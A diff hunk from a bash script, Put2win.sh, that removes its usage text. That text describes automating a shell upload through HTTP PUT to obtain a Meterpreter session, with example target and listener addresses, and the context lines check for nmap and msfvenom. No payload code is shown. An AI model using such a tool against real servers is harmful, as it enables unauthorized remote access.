@@ -50,14 +50,6 @@ for p in nmap msfvenom; do
     fi
 done 
 
-# Usage
-display_usage() { 
-	echo "This script automatize shell upload by PUT HTTP method to get meterpreter." 
-	echo -e "\nUsage:\n ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST" 
-	echo -e "\nExamples:\n - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10"
-	echo -e " - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10"
-	} 
-
 # If arguments are less than three: display usage and exit
 if [ $# -le 3 ] 
 then 
